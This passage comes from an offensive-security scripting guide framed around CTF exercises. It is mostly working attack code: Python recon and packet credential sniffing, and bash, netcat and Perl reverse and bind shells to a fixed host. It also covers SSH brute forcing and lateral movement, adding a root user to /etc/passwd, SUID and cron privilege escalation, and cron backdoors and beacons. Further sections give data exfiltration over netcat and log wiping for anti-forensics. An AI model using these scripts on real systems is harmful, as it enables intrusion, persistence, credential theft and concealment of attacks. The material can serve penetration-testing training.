        def extract_keys(obj, parent_key=''):
            keys = []
            if isinstance(obj, dict):
                for k, v in obj.items():
                    full_key = f"{parent_key}.{k}" if parent_key else k
                    keys.append(full_key)
                    keys.extend(extract_keys(v, full_key))
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    keys.extend(extract_keys(item, f"{parent_key}[{i}]"))
            return keys
        
        all_keys = extract_keys(data)
        print(f"[*] Found {len(set(all_keys))} unique keys")
        print(f"[*] API structure: {set(all_keys)}")
        
        return data
        
    except Exception as e:
        print(f"[-] Error parsing JSON: {e}")
        return None

def parse_xml_data(xml_string):
    """
    Parse XML and extract structure
    """
    try:
        root = ET.fromstring(xml_string)
        
        def traverse_xml(element, level=0):
            indent = "  " * level
            print(f"{indent}<{element.tag}>")
            
            # Print attributes
            for key, value in element.attrib.items():
                print(f"{indent}  @{key}: {value}")
            
            # Print text content
            if element.text and element.text.strip():
                print(f"{indent}  Text: {element.text.strip()}")
            
            # Recurse through children
            for child in element:
                traverse_xml(child, level + 1)
        
        traverse_xml(root)
        return root
        
    except Exception as e:
        print(f"[-] Error parsing XML: {e}")
        return None

# Usage examples
# json_data = parse_json_api("http://192.168.1.100/api/users")

xml_string = """
<users>
    <user id="1">
        <username>admin</username>
        <role>administrator</role>
    </user>
</users>
"""
# parse_xml_data(xml_string)
```

**Network Packet Data Extraction**

```python
import re
import binascii

def parse_packet_capture(pcap_file):
    """
    Extract credentials and sensitive data from packet captures
    [Unverified] - Requires scapy library and appropriate packet format
    """
    try:
        from scapy.all import rdpcap, TCP, Raw
        
        packets = rdpcap(pcap_file)
        findings = []
        
        for packet in packets:
            if packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # Search for credentials
                cred_patterns = [
                    (r'username["\']?\s*[:=]\s*["\']?([^"\'&\s]+)', 'username'),
                    (r'password["\']?\s*[:=]\s*["\']?([^"\'&\s]+)', 'password'),
                    (r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', 'basic_auth'),
                    (r'Cookie:\s*([^\r\n]+)', 'cookie')
                ]
                
                for pattern, cred_type in cred_patterns:
                    matches = re.finditer(pattern, payload, re.IGNORECASE)
                    for match in matches:
                        findings.append({
                            'type': cred_type,
                            'value': match.group(1),
                            'src': packet[TCP].sport if packet.haslayer(TCP) else None,
                            'dst': packet[TCP].dport if packet.haslayer(TCP) else None
                        })
        
        return findings
        
    except ImportError:
        print("[-] Scapy not installed: pip install scapy")
        return None
    except Exception as e:
        print(f"[-] Error parsing pcap: {e}")
        return None

def extract_base64_credentials(encoded_string):
    """
    Decode Base64 encoded credentials
    """
    import base64
    
    try:
        decoded = base64.b64decode(encoded_string).decode('utf-8')
        print(f"[+] Decoded: {decoded}")
        
        # Try to split username:password
        if ':' in decoded:
            username, password = decoded.split(':', 1)
            return {'username': username, 'password': password}
        
        return {'decoded': decoded}
        
    except Exception as e:
        print(f"[-] Error decoding: {e}")
        return None

# Usage
# findings = parse_packet_capture('capture.pcap')
# for finding in findings:
#     print(f"[+] {finding['type']}: {finding['value']}")
```

**File Metadata Extraction**

```python
import os
import hashlib
import magic  # python-magic library

def extract_file_metadata(file_path):
    """
    Extract comprehensive file metadata
    """
    try:
        stat_info = os.stat(file_path)
        
        # Calculate file hashes
        def calculate_hashes(filepath):
            hashes = {}
            
            with open(filepath, 'rb') as f:
                data = f.read()
                hashes['md5'] = hashlib.md5(data).hexdigest()
                hashes['sha1'] = hashlib.sha1(data).hexdigest()
                hashes['sha256'] = hashlib.sha256(data).hexdigest()
            
            return hashes
        
        metadata = {
            'path': file_path,
            'size': stat_info.st_size,
            'created': stat_info.st_ctime,
            'modified': stat_info.st_mtime,
            'accessed': stat_info.st_atime,
            'permissions': oct(stat_info.st_mode)[-3:],
            'hashes': calculate_hashes(file_path)
        }
        
        # Get MIME type (requires python-magic)
        try:
            metadata['mime_type'] = magic.from_file(file_path, mime=True)
            metadata['file_type'] = magic.from_file(file_path)
        except:
            metadata['mime_type'] = 'unknown'
            metadata['file_type'] = 'unknown'
        
        return metadata
        
    except Exception as e:
        print(f"[-] Error extracting metadata: {e}")
        return None

def search_files_by_pattern(directory, pattern):
    """
    Search for files matching regex pattern
    """
    import fnmatch
    
    matches = []
    
    for root, dirs, files in os.walk(directory):
        for filename in files:
            if re.search(pattern, filename):
                file_path = os.path.join(root, filename)
                matches.append(file_path)
                print(f"[+] Found: {file_path}")
    
    return matches

# Usage
# metadata = extract_file_metadata('/path/to/file')
# print(json.dumps(metadata, indent=2))

# Find all PHP files
# php_files = search_files_by_pattern('/var/www', r'\.php$')
```

**Complete Reconnaissance Script**

```python
#!/usr/bin/env python3
import requests
import re
import socket
import subprocess
from bs4 import BeautifulSoup
import concurrent.futures

def full_recon(target):
    """
    Comprehensive reconnaissance script combining multiple techniques
    """
    print(f"[*] Starting reconnaissance on {target}")
    results = {}
    
    # 1. DNS Resolution
    try:
        ip = socket.gethostbyname(target)
        results['ip_address'] = ip
        print(f"[+] Resolved IP: {ip}")
    except:
        results['ip_address'] = target
    
    # 2. Port Scanning (top ports)
    print("[*] Scanning ports...")
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((results['ip_address'], port))
            sock.close()
            if result == 0:
                return port
        except:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        port_results = executor.map(check_port, common_ports)
        open_ports = [p for p in port_results if p]
    
    results['open_ports'] = open_ports
    print(f"[+] Open ports: {open_ports}")
    
    # 3. Web Enumeration (if HTTP/HTTPS open)
    if 80 in open_ports or 443 in open_ports:
        protocol = 'https' if 443 in open_ports else 'http'
        url = f"{protocol}://{target}"
        
        print("[*] Enumerating web application...")
        try:
            response = requests.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            results['web'] = {
                'status': response.status_code,
                'title': soup.title.string if soup.title else None,
                'server': response.headers.get('Server'),
                'forms': len(soup.find_all('form')),
                'links': len(soup.find_all('a'))
            }
            
            # Extract emails
            emails = extract_emails(response.text)
            if emails:
                results['emails'] = list(set(emails))
            
            print(f"[+] Web title: {results['web']['title']}")
            print(f"[+] Server: {results['web']['server']}")
            
        except Exception as e:
            print(f"[-] Web enumeration failed: {e}")
    
    # 4. Save results
    import json
    with open(f'recon_{target}.json', 'w') as f:
        json.dump(results, indent=2, fp=f)
    
    print(f"[+] Results saved to recon_{target}.json")
    return results

# Usage
# results = full_recon("192.168.1.100")
```

---

**Important Security Considerations:**

- Always obtain proper authorization before running exploitation scripts
- Use subprocess with argument lists instead of `shell=True` to prevent command injection
- Validate and sanitize all user inputs before processing
- Be aware that aggressive scanning/exploitation may trigger IDS/IPS systems
- Rate limit your requests to avoid overwhelming target systems or detection
- Use timeouts on all network operations to prevent hanging scripts
- Log all activities for post-exploitation analysis and reporting

---

## Bash Exploitation Scripts

### Loops and Conditionals

Bash loops and conditionals form the foundation of automation scripts for enumeration, brute-forcing, and exploitation chains during CTF scenarios.

**For Loop Variations:**

```bash
# Basic iteration over ranges
for i in {1..255}; do
    ping -c 1 192.168.1.$i | grep "64 bytes" && echo "192.168.1.$i is alive"
done

# C-style loop for precise control
for ((port=1; port<=65535; port++)); do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.10/$port" 2>/dev/null && echo "Port $port is open"
done

# Iterate over command output
for user in $(cat users.txt); do
    hydra -l $user -P passwords.txt ssh://192.168.1.10 -t 4
done

# Iterate over file list
for file in /var/www/html/*.php; do
    grep -n "eval\|system\|exec" "$file" && echo "Potential webshell: $file"
done

# Parallel execution with background jobs
for ip in $(cat targets.txt); do
    nmap -sV -p- $ip -oN ${ip}_scan.txt &
done
wait  # Wait for all background jobs to complete
```

**While Loop for Continuous Operations:**

```bash
# Monitor for privilege escalation opportunities
while true; do
    ps aux | grep -i "root" | grep -v grep > current_procs.txt
    diff previous_procs.txt current_procs.txt | grep "^>" && echo "[+] New root process detected"
    cp current_procs.txt previous_procs.txt
    sleep 5
done

# Brute force with delay and error handling
while read password; do
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no user@192.168.1.10 'whoami' 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Valid password found: $password"
        break
    fi
    sleep 1
done < passwords.txt

# Connection retry logic
attempt=0
max_attempts=10
while [ $attempt -lt $max_attempts ]; do
    nc -zv 192.168.1.10 4444 2>&1 | grep succeeded && break
    ((attempt++))
    echo "Attempt $attempt failed, retrying..."
    sleep 3
done
```

**Conditional Statements for Decision Logic:**

```bash
# Check for SUID binaries and exploit conditions
if [ -u /usr/bin/find ]; then
    echo "[+] Find has SUID bit set"
    /usr/bin/find . -exec /bin/bash -p \; -quit
elif [ -u /usr/bin/vim ]; then
    echo "[+] Vim has SUID bit set"
    /usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")' -c ':q'
else
    echo "[-] No exploitable SUID binaries found"
fi

# Multi-condition checking with logical operators
if [ -w /etc/passwd ] && [ -x /usr/bin/openssl ]; then
    echo "[+] Can write to /etc/passwd and openssl is available"
    echo "hacker:$(openssl passwd -1 -salt hack password123):0:0:root:/root:/bin/bash" >> /etc/passwd
    su hacker
fi

# Case statement for multi-option handling
case "$1" in
    enum)
        find / -perm -4000 -type f 2>/dev/null
        getcap -r / 2>/dev/null
        ;;
    exploit)
        if [ -f "/tmp/exploit" ]; then
            chmod +x /tmp/exploit && /tmp/exploit
        fi
        ;;
    persist)
        echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" | crontab -
        ;;
    *)
        echo "Usage: $0 {enum|exploit|persist}"
        exit 1
        ;;
esac
```

**Advanced Conditional Expressions:**

```bash
# File test operators
[ -r /etc/shadow ] && echo "Shadow file is readable"
[ -w /etc/crontab ] && echo "Crontab is writable"
[ -x /usr/bin/docker ] && echo "Docker binary is executable"
[ -s logfile.txt ] && echo "Log file has content"

# String comparison for exploit validation
response=$(curl -s http://192.168.1.10/test.php?cmd=id)
if [[ "$response" == *"uid=0"* ]]; then
    echo "[+] RCE achieved with root privileges"
elif [[ "$response" == *"uid="* ]]; then
    echo "[+] RCE achieved with user privileges"
else
    echo "[-] RCE failed"
fi

# Numeric comparison for version checking
kernel_version=$(uname -r | cut -d'.' -f1)
if [ "$kernel_version" -lt 5 ]; then
    echo "[+] Kernel version vulnerable to DirtyCow"
    ./dirtycow
fi
```

### Grep, Sed, Awk for Parsing

These text processing tools extract critical information from command output, configuration files, and network traffic during exploitation.

**Grep Pattern Matching:**

```bash
# Extract IP addresses
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' logfile.txt

# Find credentials in files
grep -riE 'password|passwd|pwd' /var/www/html 2>/dev/null
grep -riE 'api[_-]?key|secret|token' /home/* 2>/dev/null

# Identify SUID binaries with specific names
find / -perm -4000 2>/dev/null | grep -E 'nmap|vim|find|bash|less|more'

# Extract subdomains from SSL certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | grep -oP 'DNS:\K[^,]+'

# Recursive search with context
grep -riC 3 "mysql_connect" /var/www --include="*.php"

# Invert match to exclude noise
ps aux | grep -v "grep\|systemd\|kworker"

# Count occurrences
netstat -ano | grep "ESTABLISHED" | wc -l
```

**Sed Stream Editing:**

```bash
# Extract specific lines from command output
sed -n '10,20p' largefile.txt  # Print lines 10-20

# Replace text for payload modification
sed 's/LHOST/10.10.14.5/g' exploit.sh > exploit_modified.sh
sed 's/LPORT/4444/g' -i exploit_modified.sh  # In-place editing

# Delete lines matching pattern
sed '/^#/d' config.conf  # Remove comments
sed '/^$/d' wordlist.txt  # Remove empty lines

# Extract between patterns
sed -n '/<VirtualHost/,/<\/VirtualHost>/p' /etc/apache2/sites-available/000-default.conf

# Multiple operations
sed -e 's/\r$//' -e 's/^[ \t]*//' input.txt  # Remove Windows line endings and leading whitespace

# Extract password hashes from /etc/shadow format
sed -n 's/^\([^:]*\):\([^:]*\):.*/\1:\2/p' shadow_copy.txt

# URL encoding for exploit payloads
echo "<?php system(\$_GET['cmd']); ?>" | sed 's/ /%20/g; s/</\%3C/g; s/>/\%3E/g'
```

**Awk Data Extraction:**

```bash
# Extract specific columns
netstat -ano | awk '{print $4,$5}'  # Print local and foreign addresses
ps aux | awk '$3 > 50 {print $2,$11}'  # Find processes using >50% CPU

# Filter and format output
cat /etc/passwd | awk -F: '$3 >= 1000 {print "User: "$1" | UID: "$3" | Shell: "$7}'

# Sum numeric values
cat access.log | awk '{sum+=$10} END {print "Total bytes:", sum}'

# Extract IPs from nmap output
nmap -sn 192.168.1.0/24 | awk '/Nmap scan report/{print $5}'

# Parse web server logs
awk '$9==200 && $7~/\.php/ {print $1,$7}' access.log | sort | uniq -c | sort -rn

# Multiple conditions
ps aux | awk '$1=="root" && $3>10 {print $2,$11}'

# Built-in functions
cat users.txt | awk '{print tolower($0)}'  # Convert to lowercase
echo "192.168.1.100" | awk -F. '{print $4}'  # Extract last octet

# Complex parsing - extract data from structured output
nmap -sV -oG - 192.168.1.0/24 | awk '/open/{
    gsub(/\(|\)/,"",$0);
    split($0,a," ");
    print "Host:",a[2]," Port:",a[4]," Service:",a[6]
}'
```

**Combined Grep, Sed, Awk Pipeline:**

```bash
# Extract and format SSH private keys
grep -r "BEGIN.*PRIVATE KEY" /home 2>/dev/null | \
    awk -F: '{print $1}' | \
    while read file; do
        echo "=== $file ==="
        sed -n '/BEGIN/,/END/p' "$file"
    done

# Parse nmap XML for open ports
cat scan.xml | \
    grep "portid\|service name" | \
    sed 's/<[^>]*>//g' | \
    awk 'NR%2{printf "%s ",$0;next;}1'

# Extract URLs from JavaScript files
curl -s http://target.com/app.js | \
    grep -oE '(https?://[^"'\'']+)' | \
    sed 's/[",'\'']*$//g' | \
    sort -u

# Process Burp Suite export
cat burp_requests.txt | \
    awk '/^Host:/{host=$2} /^Cookie:/{print host,$0}' | \
    sed 's/Cookie: //' | \
    sort -u
```

### Netcat Usage

Netcat serves as a versatile tool for reverse shells, bind shells, port scanning, file transfers, and banner grabbing.

**Listener and Reverse Shells:**

```bash
# Basic listener
nc -lvnp 4444

# Listener with output logging
nc -lvnp 4444 | tee -a session_log.txt

# Multiple simultaneous listeners
for port in 4444 4445 4446; do
    nc -lvnp $port &
done

# Reverse shell one-liners (victim side)
nc -e /bin/bash 10.10.14.5 4444  # Traditional (if -e is available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f  # FIFO method
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'  # Bash built-in
nc 10.10.14.5 4444 -c /bin/bash  # Alternative -c flag
```

**Bind Shells:**

```bash
# Victim creates listener
nc -lvnp 4444 -e /bin/bash
# OR
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 >/tmp/f

# Attacker connects
nc 192.168.1.10 4444
```

**Port Scanning:**

```bash
# Single port check
nc -zv 192.168.1.10 22

# Port range scan
nc -zv 192.168.1.10 1-1000 2>&1 | grep succeeded

# Fast scan with timeout
for port in {1..1000}; do
    timeout 1 nc -zv 192.168.1.10 $port 2>&1 | grep succeeded &
done
wait

# UDP port scan
nc -zuv 192.168.1.10 53,161,162
```

**Banner Grabbing:**

```bash
# HTTP banner
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# SSH banner
nc -v target.com 22

# SMTP enumeration
nc -v target.com 25 << EOF
HELO attacker.com
VRFY root
VRFY admin
QUIT
EOF

# Multiple service banners
for port in 21 22 23 25 80 443 3306 5432; do
    echo "=== Port $port ===" 
    timeout 2 nc -v 192.168.1.10 $port
done
```

**File Transfer:**

```bash
# Receiver (attacker)
nc -lvnp 4444 > received_file.txt

# Sender (victim)
nc 10.10.14.5 4444 < sensitive_data.txt

# Transfer entire directory
tar czf - /var/www/html | nc 10.10.14.5 4444  # Sender
nc -lvnp 4444 | tar xzf -  # Receiver

# Verify transfer with checksum
md5sum file.txt | nc 10.10.14.5 4444  # Send hash
md5sum received_file.txt  # Compare on receiver
```

**Web Request Exploitation:**

```bash
# Manual HTTP request
cat << 'EOF' | nc target.com 80
GET /admin.php?cmd=id HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Connection: close

EOF

# POST request with data
cat << 'EOF' | nc target.com 80
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=admin&password=test
EOF

# SQL injection via netcat
echo -e "GET /search.php?id=1' UNION SELECT NULL,NULL,NULL-- HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

**Relay and Pivoting:**

```bash
# Port forwarding relay
mkfifo backpipe
nc -l 8080 0<backpipe | nc target.com 80 1>backpipe

# Double reverse shell through compromised host
# On attacker machine:
nc -lvnp 5555

# On compromised pivot host:
mkfifo /tmp/pipe
nc -l 4444 0</tmp/pipe | nc 10.10.14.5 5555 1>/tmp/pipe

# On target machine:
nc pivot-host 4444 -e /bin/bash
```

### SSH Automation

SSH automation enables credential testing, tunneling, remote command execution, and lateral movement without manual interaction.

**SSH Key-Based Authentication Setup:**

```bash
# Generate SSH key pair without passphrase
ssh-keygen -t rsa -b 4096 -f exploit_key -N ""

# Copy public key to target (if you have initial access)
ssh-copy-id -i exploit_key.pub user@192.168.1.10

# Use specific key for connection
ssh -i exploit_key user@192.168.1.10

# Extract existing SSH keys from compromised system
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

**Automated SSH Brute Force:**

```bash
# Using sshpass for password authentication
for password in $(cat passwords.txt); do
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user@192.168.1.10 'whoami' 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Valid credentials: user:$password"
        break
    fi
done

# Parallel brute force with xargs
cat passwords.txt | xargs -P 10 -I {} bash -c 'sshpass -p {} ssh -o StrictHostKeyChecking=no user@192.168.1.10 "whoami" 2>/dev/null && echo "Password found: {}"'

# Hydra wrapper script
hydra -l user -P passwords.txt ssh://192.168.1.10 -t 4 -V -f

# Username and password brute force
for user in $(cat users.txt); do
    for pass in $(cat passwords.txt); do
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@192.168.1.10 'exit' 2>/dev/null
        [ $? -eq 0 ] && echo "[+] $user:$pass" >> valid_creds.txt
    done
done
```

**SSH Tunneling and Port Forwarding:**

```bash
# Local port forward (access remote service through SSH)
ssh -L 8080:localhost:80 user@192.168.1.10
# Now access http://localhost:8080 to reach port 80 on remote host

# Remote port forward (expose local service to remote network)
ssh -R 4444:localhost:80 user@192.168.1.10
# Remote host can now access your local port 80 via localhost:4444

# Dynamic SOCKS proxy
ssh -D 9050 user@192.168.1.10
# Configure proxychains: socks4 127.0.0.1 9050
proxychains nmap -sT 10.10.10.0/24  # Scan internal network through pivot

# Multiple forwards in one connection
ssh -L 3306:database.internal:3306 -L 445:fileserver.internal:445 user@192.168.1.10

# Reverse SOCKS proxy for pivoting
ssh -R 9050 user@attacker-vps.com
# On attacker VPS, use SOCKS proxy to access internal networks
```

**Remote Command Execution:**

```bash
# Single command execution
ssh user@192.168.1.10 'cat /etc/passwd'

# Multiple commands
ssh user@192.168.1.10 'whoami; id; uname -a'

# Privilege escalation check
ssh user@192.168.1.10 'sudo -l' 2>&1 | grep -v "password"

# Execute local script on remote host
ssh user@192.168.1.10 'bash -s' < local_enumeration_script.sh

# Execute with pseudo-TTY allocation (needed for sudo)
ssh -t user@192.168.1.10 'sudo cat /etc/shadow'

# Command output to local file
ssh user@192.168.1.10 'find / -perm -4000 2>/dev/null' > suid_binaries.txt
```

**SSH File Transfer (SCP/SFTP Automation):**

```bash
# Download file
scp user@192.168.1.10:/etc/passwd ./passwd_copy

# Upload file
scp exploit.sh user@192.168.1.10:/tmp/

# Recursive directory transfer
scp -r user@192.168.1.10:/var/www/html ./web_backup

# Transfer through jump host
scp -o ProxyJump=user@jumphost file.txt user@target:/tmp/

# SFTP batch commands
sftp -b - user@192.168.1.10 << 'EOF'
get /etc/passwd
get /etc/shadow
put exploit.sh /tmp/
bye
EOF

# Automated backup script
ssh user@192.168.1.10 'tar czf - /var/log' > logs_backup.tar.gz
```

**SSH Configuration Automation:**

```bash
# Create SSH config for quick access
cat >> ~/.ssh/config << 'EOF'
Host target
    HostName 192.168.1.10
    User compromised_user
    IdentityFile ~/.ssh/exploit_key
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR

Host pivot
    HostName 10.10.10.5
    ProxyJump target
    DynamicForward 9050
EOF

# Connect using config alias
ssh target

# Maintain persistent SSH connection
while true; do
    ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@192.168.1.10 'sleep infinity'
    echo "Connection dropped, reconnecting..."
    sleep 5
done

# Automated key deployment script
#!/bin/bash
target=$1
user=$2
password=$3

sshpass -p "$password" ssh-copy-id -o StrictHostKeyChecking=no ${user}@${target}
if [ $? -eq 0 ]; then
    echo "[+] Key deployed successfully"
    ssh ${user}@${target} 'echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys'
fi
```

**SSH Lateral Movement:**

```bash
# Enumerate SSH connections from compromised host
netstat -ano | grep ":22" | grep "ESTABLISHED"
ss -tpn | grep ":22"

# Extract SSH agent keys
ps aux | grep ssh-agent
echo $SSH_AUTH_SOCK
ssh-add -L  # List loaded keys

# SSH agent hijacking
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXX
ssh user@next-target

# Automated lateral movement
for host in $(cat internal_hosts.txt); do
    ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no user@$host 'hostname; id' 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Access granted to $host"
        ssh user@$host 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &
    fi
done
```

### Cron Scheduling

Cron scheduling establishes persistence, automates privilege escalation checks, and triggers time-based exploits.

**Cron Enumeration:**

```bash
# System-wide crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User-specific crontabs
crontab -l  # Current user
crontab -l -u username  # Specific user (requires root)
cat /var/spool/cron/crontabs/*  # Direct file access

# Find writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# Monitor cron execution (requires pspy or similar)
./pspy64 -pf -i 1000  # Watch for cron job execution
```

**Cron Syntax Reference:**

```bash
# Format: minute hour day month day-of-week command
# * * * * * /path/to/command
# | | | | |
# | | | | +-- Day of week (0-7, Sunday=0 or 7)
# | | | +---- Month (1-12)
# | | +------ Day of month (1-31)
# | +-------- Hour (0-23)
# +---------- Minute (0-59)

# Every minute
* * * * * /tmp/reverse_shell.sh

# Every 5 minutes
*/5 * * * * /tmp/check_persistence.sh

# Every hour at minute 0
0 * * * * /tmp/beacon.sh

# Daily at 2:30 AM
30 2 * * * /tmp/credential_stealer.sh

# Every Monday at 9:00 AM
0 9 * * 1 /tmp/data_exfil.sh

# First day of every month
0 0 1 * * /tmp/cleanup.sh

# Multiple times per day
0 8,12,18 * * * /tmp/periodic_check.sh
```

**Persistence Through Cron:**

```bash
# Add reverse shell to user crontab
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Add to system crontab (requires root or write access)
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab

# Create cron.d entry
cat > /etc/cron.d/persistence << 'EOF'
* * * * * root /bin/bash /tmp/reverse_shell.sh
EOF

# Persistence via cron script modification
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &" >> /etc/cron.hourly/vulnerable_script
chmod +x /etc/cron.hourly/vulnerable_script

# Stealthy persistence (only connect if attacker is listening)
cat > /tmp/stealthy_beacon.sh << 'EOF'
#!/bin/bash
nc -zv 10.10.14.5 4444 2>&1 | grep succeeded && \
    bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF
chmod +x /tmp/stealthy_beacon.sh
(crontab -l; echo "*/10 * * * * /tmp/stealthy_beacon.sh") | crontab -
```

**Privilege Escalation via Cron:**

```bash
# Check for writable cron scripts run by root
find /etc/cron* /var/spool/cron -type f -perm -o+w 2>/dev/null

# Exploit writable root cron script
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /path/to/root_cron_script.sh

# Wait for cron execution, then use SUID bash
/tmp/rootbash -p

# Exploit wildcard in cron script
# If cron script contains: tar czf /backup/*.tar.gz /var/www/html
# Create malicious files
echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > /var/www/html/exploit.sh
chmod +x /var/www/html/exploit.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ exploit.sh

# PATH hijacking in cron
# If cron script runs command without full path
echo '#!/bin/bash' > /tmp/backup
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH  # [Inference: May not affect cron depending on configuration]
# Better approach: Modify script if writable
sed -i '1s|^|PATH=/tmp:$PATH\n|' /path/to/cron_script.sh
```

**Cron-Based Enumeration Automation:**

```bash
# Automated SUID monitoring
cat > /tmp/suid_monitor.sh << 'EOF'
#!/bin/bash
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_current.txt
if [ -f /tmp/suid_previous.txt ]; then
    diff /tmp/suid_previous.txt /tmp/suid_current.txt | grep "^>" >> /tmp/new_suid.log
fi
mv /tmp/suid_current.txt /tmp/suid_previous.txt
EOF
chmod +x /tmp/suid_monitor.sh
(crontab -l; echo "*/5 * * * * /tmp/suid_monitor.sh") | crontab -

# Periodic privilege check
cat > /tmp/privesc_check.sh << 'EOF'
#!/bin/bash
sudo -l > /tmp/sudo_status_$(date +%s).txt 2>&1
getcap -r / 2>/dev/null > /tmp/capabilities_$(date +%s).txt
find / -writable -type f 2>/dev/null | head -100 > /tmp/writable_$(date +%s).txt
EOF
chmod +x /tmp/privesc_check.sh
echo "0 */2 * * * /tmp/privesc_check.sh" | crontab -

# Network monitoring cron
cat > /tmp/net_monitor.sh << 'EOF'
#!/bin/bash
netstat -ano > /tmp/connections_$(date +%Y%m%d_%H%M%S).txt
ss -tulpn >> /tmp/connections_$(date +%Y%m%d_%H%M%S).txt
EOF
(crontab -l; echo "*/10 * * * * /tmp/net_monitor.sh") | crontab -
```

**Cron Cleanup and Anti-Forensics:**

```bash
# Remove cron entries
crontab -r  # Remove entire user crontab
crontab -l | grep -v "reverse_shell" | crontab -  # Remove specific entry

# Remove from system crontab
sed -i '/backdoor/d' /etc/crontab
rm /etc/cron.d/persistence

# Clear cron logs [Inference: Log locations may vary by distribution]
echo "" > /var/log/cron
echo "" > /var/log/syslog
journalctl --vacuum-time=1d  # Clear systemd journal

# Time-delayed cleanup
cat > /tmp/cleanup.sh << 'EOF'
#!/bin/bash
crontab -r
rm /tmp/*.sh
rm /tmp/rootbash
history -c
EOF
echo "0 3 * * * /tmp/cleanup.sh && rm /tmp/cleanup.sh" | crontab -
```

**Cron Job Hijacking Techniques:**

```bash
# Monitor for new cron jobs
while true; do
    crontab -l > /tmp/cron_current
    if [ -f /tmp/cron_previous ]; then
        diff /tmp/cron_previous /tmp/cron_current && echo "[+] Cron changed at $(date)"
    fi
    cp /tmp/cron_current /tmp/cron_previous
    sleep 60
done

# Inject into existing cron
crontab -l > /tmp/original_cron
cat /tmp/original_cron | sed 's|/path/to/script.sh|/path/to/script.sh; /tmp/payload.sh|' | crontab -

# Race condition exploitation
# If cron script creates temporary file predictably
while true; do
    if [ -f /tmp/cron_temp_file ]; then
        echo "malicious payload" > /tmp/cron_temp_file
        break
    fi
done
```

---

### Important Related Topics

For comprehensive bash exploitation capabilities, consider studying:

- **Python Exploitation Scripts** - more advanced parsing and network operations
- **PowerShell Automation** - equivalent techniques for Windows environments
- **Process Injection Techniques** - combining bash automation with binary exploitation
- **Log Manipulation and Anti-Forensics** - covering tracks after automated exploitation

---

## Perl Exploitation

### Network Socket Operations

Perl's socket handling capabilities make it a powerful tool for network exploitation and reverse shell creation during CTF scenarios. The `IO::Socket::INET` module provides high-level socket operations, while low-level socket primitives offer finer control.

**Basic TCP Connection:**

```perl
use IO::Socket::INET;

# Client connection
my $socket = IO::Socket::INET->new(
    PeerAddr => '10.10.14.5',
    PeerPort => 4444,
    Proto    => 'tcp'
) or die "Connection failed: $!";

print $socket "GET / HTTP/1.0\r\n\r\n";
my $response = <$socket>;
close($socket);
```

**TCP Bind Shell:**

```perl
use IO::Socket::INET;

my $server = IO::Socket::INET->new(
    LocalPort => 4444,
    Type      => SOCK_STREAM,
    Reuse     => 1,
    Listen    => 5
) or die "Cannot create server: $!";

while (my $client = $server->accept()) {
    open(STDIN, ">&", $client);
    open(STDOUT, ">&", $client);
    open(STDERR, ">&", $client);
    exec("/bin/sh -i");
}
```

**Reverse Shell (One-liner):**

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**UDP Socket Operations:**

```perl
use IO::Socket::INET;

# UDP client
my $socket = IO::Socket::INET->new(
    PeerAddr => '192.168.1.100',
    PeerPort => 161,
